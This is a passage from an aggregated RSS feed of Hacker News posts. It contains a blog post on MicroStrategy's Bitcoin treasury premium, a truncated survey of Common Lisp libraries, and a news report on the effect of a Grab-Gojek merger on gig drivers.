<![CDATA[MicroStrategy is a very expensive way to own Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26065667">thread link</a>) | @Peteris
<br/>
February 8, 2021 | https://www.peteriserins.com/microstrategy-mstr-is-a-very-expensive-way-to-own-bitcoin/ | <a href="https://web.archive.org/web/*/https://www.peteriserins.com/microstrategy-mstr-is-a-very-expensive-way-to-own-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
            <p>A number of companies have recently started assembling Bitcoin treasuries. There are two <a href="https://bitcointreasuries.org/">good</a> <a href="https://bitcointreasuryreserve.com/">websites</a> for tracking these purchases. MicroStrategy currently has the largest known Bitcoin reserve (71,079 BTC) with 36% of the market cap attributed to the market value of their Bitcoin reserve.</p><p>They recently started to dabble in Bitcoin advocacy, hosting several <a href="https://www.microstrategy.com/en/search-results?q=bitcoin">sessions</a> and introducing ~6900 companies to their process for acquiring Bitcoin. If they succeed, expect the list to get a lot longer.</p><figure><img src="https://www.peteriserins.com/content/images/2021/02/image-2.png" alt="" srcset="https://www.peteriserins.com/content/images/size/w600/2021/02/image-2.png 600w, https://www.peteriserins.com/content/images/size/w1000/2021/02/image-2.png 1000w, https://www.peteriserins.com/content/images/2021/02/image-2.png 1048w" sizes="(min-width: 720px) 720px"><figcaption>bitcointreasuries.org</figcaption></figure><p>But why would someone pay $10 to own $3.6 in BTC?</p><p>For one, it's hard to access Bitcoin in tax efficient vehicles such as the UK's ISA accounts. Certain companies are also limited from taking on too much Bitcoin custody risk. And yes, some market participants could simply be speculating that MicroStrategy will be priced even higher due to its unique treasury strategy.</p><p>The idea is simple, $6.4 of each $10 purchase goes towards MicroStrategy's business. The business hopefully stays relatively stable and the rest of the purchase will be allocated to the BTC treasury.</p><p>But while MicroStrategy's business is in a stable <a href="https://seekingalpha.com/article/4395392-microstrategy-enterprise-software-to-bitcoin-speculation">decline</a>, the implied premium on their core business is much higher than I expected. In the chart above, the orange line indicates the implied price per each share that goes to the core business. From just over $100 earlier the year, it has now jumped to over $500, a 5x premium on the value of a falling business with no other ideas for investing excess cashflow. It may have been a good idea to invest in 2020. Not so much today.</p><p>So while it's an expensive way to buy BTC, Michael Saylor's <a href="https://www.sec.gov/Archives/edgar/data/0001050446/000119312521020760/d92691dex991.htm">comments</a> in their quarterly filings suggest another reason to buy.</p><blockquote>Going forward, we continue to plan to hold our bitcoin and invest additional excess cash flows in bitcoin. Additionally, we will explore various approaches to acquire additional bitcoin as part of our overall corporate strategy.</blockquote><p>The entire point of owning MicroStrategy is to outsource not just BTC ownership but BTC purchasing to Michael Saylor. It's the intent to buy even more BTC that has made MicroStrategy the leading Bitcoin treasury owner.</p><p>The premium may just pay for the promise that Michael Saylor together with Coinbase can identify better timing on when to make those purchases. Indeed, as an individual investor, it is trivial to purchase BTC at current prices, but substantial acquisitions by larger companies move the market and have to be carefully timed. For those companies, MicroStrategy can serve as a temporary holding point before they are able to build up their own position.</p><p><strong>Disclaimer</strong></p><p><em>This is not investment advice.</em></p>
    </div>
        
</article>                    
                </main>
</div>
        </div></div>]]>
            </description>
            <link>https://www.peteriserins.com/microstrategy-mstr-is-a-very-expensive-way-to-own-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26065667</guid>
            <pubDate>Mon, 08 Feb 2021 15:21:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[State of the Common Lisp ecosystem, 2020]]>
            </title>
            <description>
<![CDATA[
Score 291 | Comments 110 (<a href="https://news.ycombinator.com/item?id=26065511">thread link</a>) | @lelf
<br/>
February 8, 2021 | https://lisp-journey.gitlab.io/blog/state-of-the-common-lisp-ecosystem-2020/ | <a href="https://web.archive.org/web/*/https://lisp-journey.gitlab.io/blog/state-of-the-common-lisp-ecosystem-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>This is a description of the Common Lisp ecosystem, as of January, 2021,
from the perspective of a user and contributor.</p>

<p>The purpose of this article is both to give an overview of the
ecosystem, and to help drive consolidation in each domain.</p>

<p>Each application domain has recommendations for consolidating that
part of the ecosystem, and pointers for interesting future work.</p>

<p>This article is derived from
Fernando Borretti’s <a href="https://borretti.me/article/common-lisp-sotu-2015">State of the Common Lisp ecosystem from 2015</a>, hence the introduction that sounded familiar.
This new one will be an opportunity to look at what was achieved, or what is
still lacking.</p>

<p><strong>Disclaimer</strong>: This article is not a list of every project or article of interest that came out in the last years. I wrote an overview of 2018 closer to that goal <a href="https://lisp-journey.gitlab.io/blog/these-years-in-common-lisp-2018/">here</a>. More libraries can be discovered on the <a href="https://github.com/CodyReichert/awesome-cl">Awesome-cl</a> list, on GitHub and on <a href="https://www.cliki.net/">Cliki</a>.</p>

<p><strong>Acknowledgements</strong> I would like to thank @borodust, @ambrevar and @digikar for their kind feedback.</p>

<!-- markdown-toc start - Don't edit this section. Run M-x markdown-toc-refresh-toc -->

<p><strong>Table of Contents</strong></p>

<ul>
<li><a href="#application-domains">Application domains</a>

<ul>
<li><a href="#command-line">Command line</a></li>
<li><a href="#databases">Databases</a></li>
<li><a href="#concurrency">Concurrency</a></li>
<li><a href="#file-formats">File formats</a></li>
<li><a href="#gui">GUI</a></li>
<li><a href="#machine-learning">Machine Learning</a></li>
<li><a href="#system">System</a></li>
<li><a href="#web-development">Web Development</a>

<ul>
<li><a href="#backend">Backend</a></li>
<li><a href="#frontend">Frontend</a></li>
<li><a href="#javascript">JavaScript</a></li>
<li><a href="#isomorphic-web-frameworks">Isomorphic web frameworks</a></li>
</ul></li>
</ul></li>
<li><a href="#languages-interop">Languages interop</a>

<ul>
<li><a href="#apl">APL</a></li>
<li><a href="#c-c-objective-c">C, C++, Objective C</a></li>
<li><a href="#clojure">Clojure</a></li>
<li><a href="#python">Python</a></li>
<li><a href="#net-core">.Net Core</a></li>
</ul></li>
<li><a href="#development">Development</a>

<ul>
<li><a href="#implementations">Implementations</a></li>
<li><a href="#editors">Editors</a></li>
<li><a href="#developer-utilities">Developer utilities</a></li>
<li><a href="#package-management">Package Management</a></li>
<li><a href="#build-system">Build System</a></li>
<li><a href="#type-system">Type system</a></li>
<li><a href="#testing-ci">Testing, CI</a></li>
</ul></li>
<li><a href="#community">Community</a>

<ul>
<li><a href="#online-presence">Online presence</a>

<ul>
<li><a href="#new-common-lispnet-website">New common-lisp.net website</a></li>
<li><a href="#cookbook">Cookbook</a></li>
<li><a href="#awesome-cl">awesome-cl</a></li>
<li><a href="#more">More</a></li>
</ul></li>
<li><a href="#new-books">New books</a></li>
<li><a href="#companies">Companies</a></li>
<li><a href="#growth">Growth</a></li>
</ul></li>
<li><a href="#last-words">Last words</a></li>
</ul>

<!-- markdown-toc end -->



<h2 id="command-line">Command line</h2>

<p>There used to be several options to ease building and distribution of command line programs,
but now <a href="https://github.com/snmsts/roswell">Roswell</a> has gained most momentum,
and that’s a good thing. Roswell is an implementation
manager, installer and a script runner, and one of its neat features is support for
very easily compiling tiny scripts into executables.</p>

<p>Now, <a href="https://guix.gnu.org/">GNU Guix</a> has gained many CL libraries, and becomes a contender to Roswell. Guix can be used as a package manager on top of your Unix distribution. It brings reproducible builds, rollbacks, the ability to install exact versions of any library (including system dependencies), contained environments and user profiles. It makes it easy too to install the latest version of a CL implementation and libraries and, to a certain extent, to share scripts. See the article <a href="https://ambrevar.xyz/lisp-repl-shell/index.html">A Lisp REPL as my main shell</a> for insights.</p>

<p>To parse command line arguments, <a href="https://github.com/mrkkrp/unix-opts">unix-opts</a> shows decent activity. As a reminder, the CLI arguments are stored portably in <code>uiop:command-line-arguments</code>.</p>

<p><a href="https://github.com/cl-adams/adams">Adams</a> is a new UNIX system administration tool, not unlike Chef or Ansible.</p>

<p><strong>Consolidation</strong></p>

<p>More features to the <a href="https://github.com/CodyReichert/awesome-cl#scripting">sripting libraries</a>.</p>

<p><strong>Future work</strong></p>

<p>The <a href="https://github.com/cxxxr/lem/">Lem editor</a> has built a great user interface and REPL on top of ncurses, with the cl-charms library. It would be great to re-use its components, so that Lispers could easily build similar rich terminal-based interfaces.</p>

<h2 id="databases">Databases</h2>

<p><a href="https://github.com/fukamachi/mito">Mito</a> is an ORM for Common Lisp
with migrations, relationships and PostgreSQL support. It is based on
cl-dbi (a uniform interface to the various database server-specific
libraries such as cl-postgres and cl-mysql) and SxQL (a DSL for
building safe, automatically parameterized SQL queries).</p>

<p>It also has a tutorial in the Cookbook:
<a href="https://lispcookbook.github.io/cl-cookbook/databases.html">Cookbook/databases</a>.</p>

<!-- On my blog, [an article](https://lisp-journey.gitlab.io/blog/composing-queries-with-mito-aka-replacing-lazy-querysets-and-q-objects/) -->

<!-- on how to compose queries with Mito and SxQL, and on how we only need -->

<!-- lisp knowledge to replace Django functionalities. -->

<p>There are of course more libraries in that field. Some new ones since 2015 are:</p>

<p><a href="https://github.com/ruricolist/cl-yesql">cl-yesql</a> (by the author of
Serapeum, Spinneret and other great libraries) is based on Clojure’s
Yesql.</p>

<p><a href="https://github.com/kraison/vivace-graph-v3">vivace-graph</a> is a <strong>graph
database</strong> and Prolog implementation, taking design and inspiration from
CouchDB, neo4j and AllegroGraph.</p>

<p>Vsevolod Dyomkin, the author of Rutils, the Programming Algorithms
book and other libraries, is writing
<a href="https://github.com/vseloved/cl-agraph">cl-agraph</a>, a minimal client
to Franz Inc’s <a href="https://allegrograph.com/">AllegroGraph</a>. AllegroGraph is a
“horizontally distributed, multi-model (document and graph),
entity-event <strong>knowledge graph</strong> technology”. It is proprietary and has a
free version with a limit of 5 million triples. Surely one of those Lisp hidden gems we should know more about.</p>

<p>A general migration tool was lacking. We now have
<a href="https://github.com/dnaeon/cl-migratum">cl-migratum</a>, a “system which
provides facilities for performing database schema migrations,
designed to work with various databases”.</p>

<p>And of course, <a href="https://github.com/dimitri/pgloader">pgloader</a> is still a Common Lisp success story.</p>

<p><strong>Achievement</strong></p>

<p>Among the emerging ORMs, Mito is the one actively maintained that Lispers seem to have chosen. Good. CLSQL certainly still works, but we don’t hear about it and it looks outdated. So, Mito it is.</p>

<p><strong>Consolidation</strong></p>

<p>Mito has 11 contributors and is actively watched, but it probably should have another(s) core maintainers.</p>

<p><strong>Future work</strong></p>

<p>Bindings for the new databases coming out.</p>

<h2 id="concurrency">Concurrency</h2>

<p>In the last year, Manfred Bergmann developed
<a href="https://github.com/mdbergmann/cl-gserver">cl-gserver</a>. It is a
“message passing” library/framework with <strong>actors</strong> similar to
<strong>Erlang</strong> or <strong>Akka</strong>. It is an important achievement.</p>

<p>Its v1 features:</p>

<ul>
<li>actors can use a shared pool of message dispatchers which effectively allows to create millions of actors.</li>
<li>the possibility to create actor hierarchies. An actor can have child actors. An actor now can also “watch” another actor to get notified about its termination.</li>
</ul>

<p>Many other libraries exist in this area:</p>

<ul>
<li><a href="https://common-lisp.net/project/bordeaux-threads/">BordeauxThreads</a> - Portable, shared-state concurrency

<ul>
<li>the “de-facto” concurrency library.</li>
</ul></li>
<li><a href="https://github.com/lmj/lparallel">lparallel</a> - A library for parallel programming.

<ul>
<li>also solid, battle-tested and popular, aka de-facto.</li>
</ul></li>
<li><a href="https://github.com/hawkir/calispel">calispel</a> - <a href="https://en.wikipedia.org/wiki/Communicating_sequential_processes">CSP</a>-like channels for common lisp. With blocking, optionally buffered channels and a “CSP select” statement. ISC-style.

<ul>
<li>“It is complete, flexible and easy to use. I would recommend Calispel over Lparallel and ChanL.” @Ambrevar. <a href="https://github.com/CodyReichert/awesome-cl/issues/290">discussion</a></li>
</ul></li>
<li><a href="https://github.com/zkat/chanl">ChanL</a> - Portable, channel-based concurrency.</li>
<li><a href="https://github.com/orthecreedence/cl-async">cl-async</a> - A library for general-purpose, non-blocking programming.

<ul>
<li>works atop libuv</li>
</ul></li>
<li><a href="https://github.com/TBRSS/moira">Moira</a> -  Monitor and restart background threads. In-lisp process supervisor.</li>
<li><a href="https://gitlab.com/ediethelm/trivial-monitored-thread">trivial-monitored-thread</a> -
a Common Lisp library offering a way of spawning threads and being
informed when one any of them crash and die.</li>
<li><a href="https://github.com/lmj/lfarm">lfarm</a> - distributing work across machines (on top of lparallel and usocket).</li>
<li><a href="https://github.com/taksatou/cl-gearman">cl-gearman</a> - a library for the <a href="http://gearman.org/">Gearman</a> distributed job system.

<ul>
<li>Alexander Artemenko used it instead of lfarm for Ultralisp:
<a href="https://40ants.com/lisp-project-of-the-day/2020/06/0095-cl-gearman.html">https://40ants.com/lisp-project-of-the-day/2020/06/0095-cl-gearman.html</a>,
because “lfarm is not well suited to environments where worker
hosts can go down and return back later”.</li>
</ul></li>
<li><a href="https://github.com/brown/swank-crew">swank-crew</a> - distributed computation framework implemented using Swank Client.</li>
<li><a href="https://github.com/takagi/cl-coroutine">cl-coroutine</a> - a coroutine library. It uses the CL-CONT continuations library in its implementation.</li>
<li><a href="https://github.com/cosmos72/stmx">CMTX</a>: high performance transactional memory for Common Lisp.

<ul>
<li>In our opinion, a library not well known and under-appreciated.</li>
</ul></li>
</ul>

<p>(see <a href="https://github.com/CodyReichert/awesome-cl#parallelism-and-concurrency">awesome-cl#parallelism-and-concurrency</a>)</p>

<p><strong>Consolidation</strong></p>

<p>Bordeaux-Threads is <em>the</em> “de-facto” library, but there is some choice
paralysis between Lparallel, Calispel, Bordeaux-Threads and SBCL’s
contribs. Use the libraries in the wild and write about them.</p>

<h2 id="file-formats">File formats</h2>

<p>There exist Common Lisp libraries for all the major file formats:</p>

<ul>
<li>XML: <a href="https://github.com/Shinmera/plump">Plump</a> (and <a href="https://github.com/Shinmera/lquery/">Lquery</a>), as well as <a href="https://common-lisp.net/project/cxml/">CXML</a>, which can parse large files incrementally.</li>
<li>JSON: <a href="https://github.com/Rudolph-Miller/jonathan">Jonathan</a>, <a href="https://common-lisp.net/project/cl-json/">cl-json</a> or <a href="https://sabracrolleton.github.io/json-review">more</a>. With utilities:

<ul>
<li><a href="https://github.com/y2q-actionman/cl-json-pointer">json-pointer</a> - A JSON Pointer implementation.</li>
<li><a href="https://github.com/gschjetne/json-mop">json-mop</a> - A metaclass for bridging CLOS and JSON objects (remind that JSON libraries can already serialize your own objects).</li>
<li><a href="https://github.com/fisxoj/json-schema">json-schema</a></li>
</ul></li>
<li>YAML: cl-yaml</li>
<li>CSV: <a href="https://github.com/AccelerationNet/cl-csv">cl-csv</a></li>
</ul>

<p><strong>Achievement</strong></p>

<p>New in 2015, Jonathan is now a good first choice for an easy to use and fast JSON encoder and decoder.</p>

<p><strong>Consolidation</strong></p>

<p>There is not a predominant JSON library. This leads to choice paralysis.</p>

<p>They all represent null values differently. We need a library that
“does the right thing”. See maybe the massive <a href="https://github.com/xh4/web-toolkit#json">web-toolkit</a> for its JSON handling ?</p>

<blockquote>
<p>It distinguishes null, false and [] from Lisp’s NIL thus supports identical transformation between JSON values. It provides object constructor and accessor to build and access nesting JSON objects.</p>
</blockquote>

<p>Give the <a href="https://github.com/sharplispers/xpath">XPath</a> library some love and documentation.</p>

<p><strong>Future Work</strong></p>

<p>Still valid from 2015:</p>

<blockquote>
<p>A YAML parser so that cl-yaml doesn’t depend on the libyaml library would make distribution far simpler.</p>
</blockquote>

<h2 id="gui">GUI</h2>

<p>A usual complain in Common Lisp land is the lack of a complete,
cross-platform GUI solution. Ltk is a very good library, but Tk is
limited. Qtools is great, but is only for Qt4.</p>

<p>A lot has happened, and is still happening (if you watch the right
repositories, you know that a Qt5 wrapper is in the works (ECL already has Qt5 bindings: <a href="https://gitlab.com/eql/EQL5/">EQL5</a>, with an <a href="https://gitlab.com/eql/EQL5-Android">Android port</a>)).</p>

<p>edit: see also <a href="https://gitlab.com/eql/eql5-sailfish">EQL5-sailfish</a> for Sailfish OS. <a href="https://openrepos.net/user/13436/programs">Here</a> are two example apps.</p>

<p>Matthew Kennedy wrote excellent FFI bindings to the IUP Portable User
Interface library: <a href="https://github.com/lispnik/iup/">IUP</a>. IUP is
cross-platform (Windows, macOS, GNU/Linux, with new Android, iOS,
Cocoa and Web Assembly drivers), has many widgets (but less than Qt), has a small API and
is actively developed. IUP was created at the PUC university of Rio de Janeiro.</p>

<p>Nicolas Hafner started <a href="https://github.com/Shirakumo/alloy">Alloy</a>, a
new user interface protocol and toolkit implementation, which he uses in his Kandria game.</p>

<p>Very recently, David Botton released <a href="https://github.com/rabbibotton/clog">CLOG</a>, “the Common Lisp Omnificent GUI”:</p>

<blockquote>
<p>CLOG uses web technology to produce graphical user interfaces for applications locally or remotely. CLOG can take the place, or work alongside, most cross-platform GUI frameworks and website frameworks. The CLOG package starts up the connectivity to the browser or other websocket client (often a browser embedded in a native template application.)</p>

<p>It is complete enough for most uses.</p>
</blockquote>

<p>There are more GUI libraries and frameworks: <a href="https://github.com/CodyReichert/awesome-cl#Gui">https://github.com/CodyReichert/awesome-cl#Gui</a> (and more under the works). In particular, LispWorks’ CAPI is still presented as the best in town by the ones who tried it.</p>

<p><strong>Consolidation</strong></p>

<p>Since roughly October, 2020, Nicolas Hafner works full time on
<a href="https://kandria.com/">Kandria</a>. Supporting his work, through <a href="https://github.com/sponsors/Shinmera">GitHub
sponsors</a> or
<a href="https://ko-fi.com/shinmera">ko-fi</a> would be 1) a great sign of recognition and 2) useful for the ecosystem, especially for Alloy.</p>

<p>I wrote an introduction to these frameworks in the Cookbook:
<a href="https://lispcookbook.github.io/cl-cookbook/gui.html">Cookbook/gui</a>. More
examples or demo projects would be welcome.</p>

<p>There are two actively maintained diverged forks of the GTK bindings. A …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lisp-journey.gitlab.io/blog/state-of-the-common-lisp-ecosystem-2020/">https://lisp-journey.gitlab.io/blog/state-of-the-common-lisp-ecosystem-2020/</a></em></p>]]>
            </description>
            <link>https://lisp-journey.gitlab.io/blog/state-of-the-common-lisp-ecosystem-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26065511</guid>
            <pubDate>Mon, 08 Feb 2021 15:10:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Southeast Asia’s hottest tech deal would devastate gig workers]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26065470">thread link</a>) | @RealDeinonychus
<br/>
February 8, 2021 | https://restofworld.org/2021/grab-gojek-merger-could-devastate-gig-workers/ | <a href="https://web.archive.org/web/*/https://restofworld.org/2021/grab-gojek-merger-could-devastate-gig-workers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

			<!-- Article Start -->
			
<p><span>W</span>hen Grab drivers in Ho Chi Minh City gathered late last year to protest against the ride-hailing company’s new fee structure, Nghia went instead to his other job, cutting cloth at an apparel factory. He had been driving for Grab for a few years, but even if he was free to join the demonstration, he wouldn’t have. “If I spoke up, I’d get nothing,’’ Nghia said.&nbsp;</p>



<p>In December 2020, drivers reported that the commissions that Grab Vietnam takes from them suddenly increased, from around 20% to nearly 30% on its motorbike service GrabBike, and even more on GrabCar, its taxi offering. The change came after the Vietnamese government had abruptly increased an <a rel="noreferrer noopener" href="https://e.vnexpress.net/news/business/companies/taxman-grab-at-odds-over-new-tax-regime-4204198.html" target="_blank">existing tax</a> on ride-hailing firms. Many drivers felt that Grab had passed the burden onto drivers and passengers, although the company says that this was a misunderstanding and that drivers’ commissions did not change, but that the new tax was added to fares, then deducted from drivers’ takings at the same time as the commission.</p>



<p>Nghia, a 31-year-old migrant from the Mekong Delta region in southern <a href="https://restofworld.org/2020/nguyen-viet-anh-docosan-vietnam/">Vietnam</a>, who asked to be identified by only his first name, started driving for Grab because he heard that he could earn more through the app than its competitors. Grab is one of several venture-backed firms vying for customers in Vietnam. The country’s fast-growing and rapidly digitizing economy has opened up a new frontier for tech companies in Southeast Asia.</p>



<p>Over the past few years, Grab and other ride-hailing players like Gojek Vietnam, owned by the Indonesian unicorn Gojek, have burned millions of dollars in investor cash <a href="https://restofworld.org/2021/fighting-off-the-unicorns/">trying to attract price-sensitive Vietnamese customers</a> and capture as much market share as possible. The strategy included offering steep discounts to consumers and generous incentives to drivers, who work as independent contractors with few labor protections.&nbsp;</p>



<p>The problem is that now their investors are eager to turn a profit, and the well of cash is starting to dry up. In Vietnam and other Southeast Asian countries, like Indonesia, Grab and Gojek had been raising prices for passengers before the Covid-19 lockdowns drastically cut the number of people using ride-hailing apps. Gig workers on the platform said that they felt squeezed before the pandemic, and more so during it.</p>



<p>But the two companies are also part of a pattern that started emerging around the world long before the pandemic. Enormous venture firms, most notably the Japanese mega-fund SoftBank, have poured billions into startups with the express purpose of winner-takes-all domination. Often, when it comes time to actually make money, it’s <a href="https://www.nytimes.com/2019/11/12/technology/softbank-startups.html">workers at the bottom</a> who bear the burden.&nbsp;</p>



<p>For Nghia,&nbsp;this has resulted in a one-two punch of fewer rides and lower fees, making driving for Grab barely worth his time. “Driving for a day, I don’t earn as much as people selling lottery tickets,” he said, referring to the roadside hawkers that are common in Ho Chi Minh City. “I have only been making around 200,000 dong [$8.70] a day this year, working from 7 a.m. to 9 p.m., not to mention the money I have to give back to Grab.”</p>



<p>Drivers aren’t the only ones unhappy with the ride-hailing firms. SoftBank, Grab’s biggest backer, is getting tired of Grab and Gojek “bleeding a lot of money,” according to an investor with knowledge of both companies, and <a href="https://www.ft.com/content/865dae7e-24ad-446d-a20c-4bfadfdb3e1d">wants the two to merge</a>. The reason is that they have fought their way into an expensive stalemate across Southeast Asia. Both Grab and Gojek have become multi-billion-dollar businesses by expanding into other services, though neither has yet turned a profit. While investors have continued to back them in an effort to build de facto monopolies, neither company has found a decisive advantage, and patience is wearing thin.&nbsp;</p>



<p>If a merger doesn’t happen, Gojek is reportedly <a href="https://www.ft.com/content/0775a49e-d3fd-4445-a394-19039a8561f6">in talks with another Indonesian unicorn</a>, the e-commerce company Tokopedia, while <a href="https://www.bloomberg.com/news/articles/2021-01-25/grab-is-said-to-pick-morgan-stanley-jpmorgan-for-u-s-ipo">Grab has reportedly selected banks</a> to explore an initial public offering in New York. Grab and Gojek did not respond to repeated requests for comment.</p>



<p>Gojek, Grab, and Tokopedia are enormous acquirers of technology and talent, whose gravity shapes the entire landscape. If they do consolidate, the effects are likely to ripple across the whole region. “If Gojek and Grab did the merger, the two organizations would have an unassailable monopoly on ride-hailing services in Southeast Asia,” one investor with knowledge of negotiations between the two companies told <em>Rest of World. </em>(Like all venture capital sources in this story, they spoke on the condition of anonymity.)</p>



<p>Labor groups worry that, if a merger were to happen, drivers would have less leverage than ever before. “They can control many things, monopolize the system and so on,” said Taha Syafariel Baraqbah, acting chairman of Indonesia’s Online Drivers’ Association, who goes by Ariel. “Of course we are afraid and feel that the conditions will be even more arbitrary.”</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00307-40x30.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00307-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00307-400x300.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00307-600x450.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00307-1000x750.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00307-1600x1200.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00307-2800x2100.jpg 2800w, " sizes="(max-width: 640px) 100vw, calc(100vw - 40px)" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>

    <figure>
      <div>
				<ul>
					<li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00041-40x30.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00041-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00041-400x300.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00041-600x450.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00041-1000x750.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00041-1600x1200.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00041-2800x2100.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00193-40x30.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00193-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00193-400x300.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00193-600x450.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00193-1000x750.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00193-1600x1200.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00193-2800x2100.jpg 2800w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li>
				</ul>
			</div>
      <figcaption>Gojek and Grab riders wait for passengers in Jakarta.</figcaption>
    </figure>


<hr>



<p><strong>Gojek was founded</strong> in Indonesia in 2010 by Harvard Business School graduate and former McKinsey consultant Nadiem Makarim and his high school friend Michaelangelo Moran. Two years later, Grab was launched in Malaysia by two other Harvard graduates, Anthony Tan and Tan Hooi Ling. They later relocated the company to Singapore, in 2014.&nbsp;</p>



<p>Both startups attracted big-name investors, like Sequoia India and Golden Gate Ventures, which were lured by the tantalizing opportunity to reach consumers in Southeast Asia’s populous and increasingly prosperous markets. As Grab and Gojek continued to grow, so did the scale of their funding rounds and backers. SoftBank invested in Grab in 2014, while the Singaporean state investment fund <a href="https://www.reuters.com/article/us-go-jek-fundraising/google-temasek-investing-in-indonesias-go-jek-as-ride-hailing-rivalry-deepens-sources-idUSKBN1F70GS">Temasek</a> and the Chinese tech giant <a href="https://www.reuters.com/article/us-gojek-m-a-tencent/chinas-tencent-invests-in-indonesias-go-jek-amid-se-asia-push-sources-idUSKBN19P17N">Tencent</a> took stakes in Gojek soon after. In total, Grab has raised more than $12 billion, while Gojek has raised around $5 billion, according to the database Crunchbase.</p>



<p>Ride-hailing was an easy business to get into, since the existing transportation sector was dominated by traditional taxi companies, which had inflexible business models. There “was an obvious inefficiency and a market gap where you could come in and undercut the incumbents,” said Nitin Pangarkar, a strategy and policy professor at NUS Business School in Singapore. “The transport business was an asset-light model,” he explained, in that the drivers owned their own cars and motorbikes, and “it was a model that had been tried out elsewhere.”</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00295-40x53.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00295-600x1066.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00295-400x533.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00295-600x800.jpg 600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00295-1000x1333.jpg 1000w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00295-1600x2133.jpg 1600w, https://restofworld.org/wp-content/uploads/2021/02/20210128_ROW_GOJEK_GRAB_00295-2800x3733.jpg 2800w, " sizes="(max-width: 640px) 100vw, 300px" alt="A Grab rider and his passenger wait at a light at Pancoran intersection.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>To attract customers, Grab and Gojek spent heavily on deep discounts, eschewing profits in an effort to beat out the competition. “Ride hailing, definitely, was a money loser,” Pangarkar said. “That was because these crazy venture capitalists were willing to fund these price wars.”&nbsp;</p>



<p>Over the past few years, Grab and Gojek have expanded across Southeast Asia and begun to broaden the scope of their services, adding <a href="https://restofworld.org/2020/stat-of-the-day/cloud-kitchen-food/">food delivery</a>, groceries, payments, and logistics. In Indonesia, Gojek bought a stake in a bank, while in Singapore, Grab partnered with a telecommunications company to bid for a <a href="https://www.reuters.com/article/us-singtel-digital-banking-grab-holdings/singtel-grab-join-forces-for-singapore-digital-bank-license-idUSKBN1YY005">digital banking license</a>. Today, Grab and Gojek are no longer just loss-making ride-hailing companies — they’re sprawling conglomerates that convert investor cash into user numbers.</p>



<p>Even where ride hailing has become profitable in individual countries, the companies have reinvested into expanding into other business lines.</p>



